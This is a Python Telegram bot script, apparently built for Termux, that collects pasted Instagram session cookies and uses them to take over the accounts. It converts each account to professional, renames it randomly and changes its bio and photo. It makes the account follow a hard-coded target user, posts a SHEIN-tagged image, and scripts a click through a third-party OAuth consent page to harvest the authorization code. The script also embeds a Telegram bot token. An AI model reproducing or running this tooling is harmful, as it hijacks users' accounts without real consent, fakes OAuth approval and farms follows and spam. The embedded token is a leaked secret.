
import os
import json
import time
import random
import string
import asyncio
import logging
from datetime import datetime
import sys
import aiohttp
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor
from aiohttp import FormData

# --- Modified for Termux ---
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException

try:
    from aiogram import Bot, Dispatcher, html, F
    from aiogram.client.default import DefaultBotProperties
    from aiogram.enums import ParseMode
    from aiogram.filters import Command, CommandStart, StateFilter
    from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
    AIOGRAM_AVAILABLE = True
except ImportError:
    print("Please install aiogram: pip install aiogram")
    AIOGRAM_AVAILABLE = False
    sys.exit(1)

# Globals
GLOBAL_IMAGE_PATH = None
TELEGRAM_BOT_TOKEN = "8078020961:AAGpLfJTdC9vYn64mEE7y6KfHN7wjRaMTOo"
IMAGE_URL = "https://i.ibb.co/1JJftbJB/hellio.jpg"
DEFAULT_BIO = "F - 22 , wish me on 21 november."
DEFAULT_CAPTION = "Another good day #shein #sheinverse #sheinforall #sheinyourday"
ADMIN_USER_ID = 6240677007
MANDATORY_CHANNEL = "@shein_pro_link"
TARGET_USER_ID = "77056154878"  # ritika_raj836
TARGET_USERNAME = "arnav_kumar_singh90"

admin_data = {
    'total_follows': 0,
    'followed_users': set(),
    'broadcast_history': []
}
admin_lock = asyncio.Lock()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

CONCURRENT_LIMIT = 5
semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)

membership_cache = {}

async def retry_async_operation(operation, max_retries=5, base_delay=1):
    for attempt in range(max_retries):
        try:
            return await operation()
        except Exception as e:
            delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
            logging.warning(f"Attempt {attempt + 1} failed: {str(e)}. Retrying in {delay}s")
            if attempt == max_retries - 1:
                raise e
            await asyncio.sleep(delay)

def generate_timestamp() -> str:
    return str(int(time.time() * 1000))

def generate_random_username(length: int = 12) -> str:
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def generate_random_first_name() -> str:
    first_names = ['Alex', 'Sam', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Quinn', 'Avery', 'Drew', 'Skyler', 'Blake', 'Reese', 'Cameron', 'Finley', 'Rowan']
    return random.choice(first_names)

def parse_cookies(cookie_string: str) -> Dict[str, str]:
    cookies = {}
    if not cookie_string:
        return cookies
    cookie_items = cookie_string.split(';')
    for item in cookie_items:
        item = item.strip()
        if '=' in item and len(item.split('=', 1)) == 2:
            key, value = item.split('=', 1)
            if key in ['ds_user_id', 'sessionid', 'csrftoken']:
                if key == 'rur' and value.startswith('"') and value.endswith('"'):
                    value = value[1:-1].replace('\\"', '"')
                cookies[key] = value
    if not all(k in cookies for k in ['ds_user_id', 'csrftoken']):
        raise ValueError("Missing required cookies: ds_user_id or csrftoken")
    return cookies

def extract_user_id(cookies: Dict[str, str]) -> Optional[str]:
    if 'ds_user_id' in cookies:
        return cookies['ds_user_id']
    elif 'sessionid' in cookies:
        session_parts = cookies['sessionid'].split(':')
        if len(session_parts) > 0:
            return session_parts[0]
    return None

def get_csrf_token(cookies: Dict[str, str]) -> str:
    return cookies.get('csrftoken', '')

async def download_image(url: str, filename: str = "temp_image.jpg") -> Optional[str]:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                response.raise_for_status()
                content = await response.read()
                with open(filename, 'wb') as f:
                    f.write(content)
                return filename
    except Exception as e:
        logging.error(f"Error downloading image: {str(e)}")
        return None

async def convert_to_professional(session: aiohttp.ClientSession, cookies: Dict[str, str], csrf_token: str) -> Dict[str, Any]:
    url = 'https://www.instagram.com/api/v1/business/account/convert_account/'
    headers = {
        'x-csrftoken': csrf_token,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    data = {
        'category_id': '2700',
        'create_business_id': 'true',
        'entry_point': 'ig_web_settings',
        'set_public': 'true',
        'should_bypass_contact_check': 'true',
        'should_show_category': '0',
        'to_account_type': '3',
    }
    async def op():
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

async def get_professional_config(session: aiohttp.ClientSession, cookies: Dict[str, str]) -> Dict[str, Any]:
    url = 'https://www.instagram.com/api/v1/business/account/get_professional_conversion_nux_configuration?is_professional_signup_flow=false'
    headers = {
        'x-csrftoken': get_csrf_token(cookies),
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    async def op():
        async with session.get(url, headers=headers, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

async def update_bio(session: aiohttp.ClientSession, cookies: Dict[str, str], csrf_token: str, first_name: str, username: str) -> Dict[str, Any]:
    url = 'https://www.instagram.com/api/v1/web/accounts/edit/'
    headers = {
        'x-csrftoken': csrf_token,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    data = {
        'biography': DEFAULT_BIO,
        'chaining_enabled': 'on',
        'external_url': '',
        'first_name': first_name,
        'username': username,
    }
    async def op():
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

async def change_profile_picture(session: aiohttp.ClientSession, cookies: Dict[str, str], csrf_token: str, image_path: str) -> Dict[str, Any]:
    url = 'https://www.instagram.com/api/v1/web/accounts/web_change_profile_picture/'
    headers = {
        'x-csrftoken': csrf_token,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    form = FormData()
    form.add_field('profile_pic', open(image_path, 'rb'), filename=os.path.basename(image_path), content_type='image/jpeg')
    async def op():
        async with session.post(url, headers=headers, data=form, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

async def check_coppa_status(session: aiohttp.ClientSession, cookies: Dict[str, str], user_id: str) -> tuple:
    url = 'https://www.instagram.com/graphql/query'
    headers = {
        'x-csrftoken': get_csrf_token(cookies),
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    timestamp = generate_timestamp()
    data = {
        'av': user_id,
        '__d': 'www',
        '__user': '0',
        '__a': '1',
        'variables': '{}',
        'doc_id': '24797863709808827',
    }
    async def op():
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json(), timestamp
    return await retry_async_operation(op)

async def upload_photo(session: aiohttp.ClientSession, cookies: Dict[str, str], image_path: str, upload_id: str) -> Dict[str, Any]:
    url = f'https://i.instagram.com/rupload_igphoto/fb_uploader_{upload_id}'
    headers = {
        'x-entity-length': str(os.path.getsize(image_path)),
        'x-entity-name': f'fb_uploader_{upload_id}',
        'x-entity-type': 'image/jpeg',
        'x-instagram-rupload-params': json.dumps({
            "media_type": 1,
            "upload_id": str(upload_id),
            "upload_media_height": 215,
            "upload_media_width": 215
        }),
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    async def op():
        with open(image_path, 'rb') as f:
            data_content = f.read()
            async with session.post(url, headers=headers, data=data_content, cookies=cookies) as resp:
                resp.raise_for_status()
                return await resp.json()
    return await retry_async_operation(op)

async def configure_media_post(session: aiohttp.ClientSession, cookies: Dict[str, str], upload_id: str) -> Dict[str, Any]:
    url = 'https://www.instagram.com/api/v1/media/configure/'
    headers = {
        'x-csrftoken': get_csrf_token(cookies),
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    data = {
        'caption': DEFAULT_CAPTION,
        'upload_id': str(upload_id),
        'source_type': 'library',
        'media_share_flow': 'creation_flow',
        'disable_comments': '0',
    }
    async def op():
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

async def follow_target_user(session: aiohttp.ClientSession, cookies: Dict[str, str], csrf_token: str, target_user_id: str) -> Dict[str, Any]:
    url = 'https://www.instagram.com/graphql/query'
    headers = {
        'x-csrftoken': csrf_token,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    }
    data = {
        'av': target_user_id,
        '__d': 'www',
        '__user': '0',
        '__a': '1',
        'variables': json.dumps({"target_user_id": target_user_id, "container_module": "profile", "nav_chain": "PolarisOneTapAfterLoginRoot:OneTapUpsellPage:1:via_cold_start,PolarisProfilePostsTabRoot:profilePage:2:unexpected"}),
        'doc_id': '9740159112729312'
    }
    async def op():
        async with session.post(url, headers=headers, data=data, cookies=cookies) as resp:
            resp.raise_for_status()
            return await resp.json()
    return await retry_async_operation(op)

selenium_pool = ThreadPoolExecutor(max_workers=3)

def sync_generate_redirect_link(cookies: Dict[str, str]) -> tuple:
    driver = None
    max_retries = 3
    
    # --- TERMUX PATHS ---
    termux_chromium_path = "/data/data/com.termux/files/usr/bin/chromium-browser"
    termux_driver_path = "/data/data/com.termux/files/usr/bin/chromedriver"
    
    for retry_attempt in range(max_retries):
        try:
            chrome_options = Options()
            # Important settings for Termux
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
            
            # Setup Driver for Termux or PC
            if os.path.exists(termux_chromium_path) and os.path.exists(termux_driver_path):
                logging.info("Detected Termux Environment. Using custom binary paths.")
                chrome_options.binary_location = termux_chromium_path
                service = Service(termux_driver_path)
                driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                logging.info("Standard environment detected. Using default paths.")
                driver = webdriver.Chrome(options=chrome_options)

            logging.info("Navigating to Instagram main page...")
            driver.get("https://www.instagram.com")
            
            logging.info("Adding Instagram cookies...")
            cookies_to_add = []
            for cookie_name, cookie_value in cookies.items():
                if cookie_name in ['ig_did', 'rur']:
                    continue
                cookie_dict = {
                    'name': cookie_name,
                    'value': cookie_value,
                    'domain': '.instagram.com',
                    'path': '/',
                    'secure': True,
                    'httpOnly': False,
                    'sameSite': 'Lax'
                }
                cookies_to_add.append(cookie_dict)
            
            for cookie_dict in cookies_to_add:
                try:
                    driver.add_cookie(cookie_dict)
                except Exception as e:
                    pass
            
            driver.refresh()
            time.sleep(2)
            
            logging.info("Navigating to Instagram consent page...")
            CONSENT_URL = 'https://www.instagram.com/consent/?flow=ig_biz_login_oauth&params_json={"client_id":"713904474873404","redirect_uri":"https://sheinverse.galleri5.com/instagram","response_type":"code","state":null,"scope":"instagram_business_basic","logger_id":"84155d6f-26ca-484b-a2b2-cf3b579c1fc7","app_id":"713904474873404","platform_app_id":"713904474873404"}&source=oauth_permissions_page_www'
            driver.get(CONSENT_URL)
            time.sleep(3)
            
            logging.info("Looking for 'Allow' button...")
            allow_button = None
            # Simplified selectors for mobile view
            selectors = [
                "//button[contains(text(), 'Allow')]",
                "//div[contains(text(), 'Allow')]",
                "//button[@type='submit']",
                "//div[@role='button']"
            ]
            
            for selector in selectors:
                try:
                    allow_button = driver.find_element(By.XPATH, selector)
                    if "Allow" in allow_button.text or "allow" in allow_button.text.lower():
                        break
                except:
                    continue
            
            if allow_button:
                logging.info("Clicking 'Allow' button...")
                driver.execute_script("arguments[0].click();", allow_button)
            else:
                logging.warning("Explicit Allow button not found, checking if already redirected...")

            logging.info("Waiting for redirect...")
            redirect_url = None
            oauth_code = None
            max_wait_time = 30
            start_time = time.time()
            
            while time.time() - start_time < max_wait_time:
                current_url = driver.current_url
                if "sheinverse.galleri5.com" in current_url and "code=" in current_url:
                    redirect_url = current_url
                    code_params = parse_qs(urlparse(current_url).query)
                    oauth_code = code_params.get('code', [None])[0]
                    break
                time.sleep(1)
                
            if redirect_url and oauth_code:
                logging.info(f"✅ Success! Found code: {oauth_code}")
                return redirect_url, oauth_code
            else:
                raise Exception("Redirect timeout or code not found")
                
        except Exception as e:
            logging.error(f"Error in selenium: {str(e)}")
            if retry_attempt < max_retries - 1:
                time.sleep(2)
                continue
            raise
        finally:
            if driver:
                driver.quit()
    raise Exception("All retries failed")

async def generate_redirect_link(cookies: Dict[str, str]) -> tuple:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(selenium_pool, sync_generate_redirect_link, cookies)

async def show_admin_panel(message):
    try:
        keyboard = ReplyKeyboardBuilder()
        keyboard.button(text="📊 Statistics")
        keyboard.button(text="📢 Broadcast")
        keyboard.button(text="👥 Followers Report")
        keyboard.button(text="🚪 Exit Admin Panel")
        keyboard.adjust(2)
        await message.answer("👑 Admin Panel", reply_markup=keyboard.as_markup(resize_keyboard=True))
    except Exception as e:
        await message.answer("❌ Error loading admin panel.")

async def show_statistics(message):
    async with admin_lock:
        stats_message = f"📊 Bot Statistics\nFollows: {admin_data['total_follows']}"
    await message.answer(stats_message)

async def broadcast_message(message, bot):
    await message.answer("📢 Broadcast feature placeholder")

async def show_followers_report(message):
    async with admin_lock:
        report_message = f"👥 Report\nTotal: {admin_data['total_follows']}"
    await message.answer(report_message)

async def handle_admin_command(message, bot):
    text = message.text
    if text == "📊 Statistics":
        await show_statistics(message)
    elif text == "📢 Broadcast":
        await broadcast_message(message, bot)
    elif text == "👥 Followers Report":
        await show_followers_report(message)
    elif text == "🚪 Exit Admin Panel":
        await message.answer("Exiting...", reply_markup=create_main_keyboard())
    else:
        await message.answer("Unknown command.")

async def is_user_in_channel(bot: Bot, user_id: int) -> bool:
    now = time.time()
    if user_id in membership_cache and now < membership_cache[user_id][1]:
        return membership_cache[user_id][0]
    try:
        member = await bot.get_chat_member(MANDATORY_CHANNEL, user_id)
        is_member = member.status in ['member', 'administrator', 'creator']
        membership_cache[user_id] = (is_member, now + 300)
        return is_member
    except:
        return False # Fail safe to False if error

class InstagramAutomationBot:
    def __init__(self):
        self.session = None
        self.cookies = {}
        self.user_id = None
        self.csrf_token = None

    async def init_session(self):
        if self.session is None:
            connector = aiohttp.TCPConnector(limit=10, ssl=False)
            self.session = aiohttp.ClientSession(connector=connector)

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def set_cookies(self, cookie_string: str):
        self.cookies = parse_cookies(cookie_string)
        self.user_id = extract_user_id(self.cookies)
        self.csrf_token = get_csrf_token(self.cookies)

    async def full_setup(self, message) -> str:
        await self.init_session()
        try:
            async with semaphore:
                if not GLOBAL_IMAGE_PATH or not os.path.exists(GLOBAL_IMAGE_PATH):
                    raise Exception("Image download failed")
                
                first_name = generate_random_first_name()
                username = generate_random_username()
                progress_message = await message.answer("⏳ Processing... (Converting Account)")
                
                await convert_to_professional(self.session, self.cookies, self.csrf_token)
                await get_professional_config(self.session, self.cookies)
                
                await progress_message.edit_text("⏳ Updating Profile...")
                await update_bio(self.session, self.cookies, self.csrf_token, first_name, username)
                await change_profile_picture(self.session, self.cookies, self.csrf_token, GLOBAL_IMAGE_PATH)
                
                await follow_target_user(self.session, self.cookies, self.csrf_token, TARGET_USER_ID)
                async with admin_lock:
                     if self.user_id not in admin_data['followed_users']:
                            admin_data['total_follows'] += 1
                            admin_data['followed_users'].add(self.user_id)
                
                await progress_message.edit_text("⏳ Uploading Post...")
                _, upload_id = await check_coppa_status(self.session, self.cookies, self.user_id)
                await upload_photo(self.session, self.cookies, GLOBAL_IMAGE_PATH, upload_id)
                post_res = await configure_media_post(self.session, self.cookies, upload_id)
                media_id = post_res.get('media', {}).get('id', 'Unknown')

                await progress_message.edit_text("⏳ Generating Link (Takes 10-20s)...")
                redirect_url, oauth_code = await generate_redirect_link(self.cookies)
                
                return f"✅ DONE!\n\n🆔 Post ID: {media_id}\n🔗 URL: {redirect_url}\n🔑 Code: {oauth_code}"
        except Exception as e:
            return f"❌ Error: {str(e)}"
        finally:
            await self.close_session()

    async def generate_redirect_link_only(self, message) -> str:
        await self.init_session()
        try:
            async with semaphore:
                await message.answer("⏳ Generating Link on Termux...")
                redirect_url, oauth_code = await generate_redirect_link(self.cookies)
                return f"🔗 URL: {redirect_url}\n🔑 Code: {oauth_code}"
        except Exception as e:
            return f"❌ Error: {str(e)}"
        finally:
            await self.close_session()

class BotStates(StatesGroup):
    waiting_for_cookies_full = State()
    waiting_for_cookies_redirect = State()
    admin_panel = State()

def create_main_keyboard():
    keyboard = ReplyKeyboardBuilder()
    keyboard.button(text="🚀 Full Setup")
    keyboard.button(text="🔗 Generate Redirect Link")
    if ADMIN_USER_ID: # Show if admin exists
        keyboard.button(text="👑 Admin Panel")
    keyboard.adjust(1)
    return keyboard.as_markup(resize_keyboard=True)

async def main():
    global GLOBAL_IMAGE_PATH
    logging.info("Starting Bot...")
    GLOBAL_IMAGE_PATH = await download_image(IMAGE_URL)
    
    bot = Bot(token=TELEGRAM_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())

    @dp.message(CommandStart())
    async def start(message: Message):
        if not await is_user_in_channel(bot, message.from_user.id):
             await message.answer(f"Please join {MANDATORY_CHANNEL} first.")
             return
        await message.answer("👋 Hello!", reply_markup=create_main_keyboard())

    @dp.message(F.text == "🚀 Full Setup")
    async def full_setup_req(message: Message, state: FSMContext):
        await message.answer("Send Cookies:")
        await state.set_state(BotStates.waiting_for_cookies_full)

    @dp.message(BotStates.waiting_for_cookies_full)
    async def full_setup_exec(message: Message, state: FSMContext):
        await state.clear()
        bi = InstagramAutomationBot()
        await bi.set_cookies(message.text)
        res = await bi.full_setup(message)
        await message.answer(res)

    @dp.message(F.text == "🔗 Generate Redirect Link")
    async def link_req(message: Message, state: FSMContext):
        await message.answer("Send Cookies:")
        await state.set_state(BotStates.waiting_for_cookies_redirect)

    @dp.message(BotStates.waiting_for_cookies_redirect)
    async def link_exec(message: Message, state: FSMContext):
        await state.clear()
        bi = InstagramAutomationBot()
        await bi.set_cookies(message.text)
        res = await bi.generate_redirect_link_only(message)
        await message.answer(res)

    @dp.message(F.text == "👑 Admin Panel")
    async def admin_enter(message: Message, state: FSMContext):
        if message.from_user.id == ADMIN_USER_ID:
            await show_admin_panel(message)
            await state.set_state(BotStates.admin_panel)

    @dp.message(BotStates.admin_panel)
    async def admin_handler(message: Message):
        await handle_admin_command(message, bot)

    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
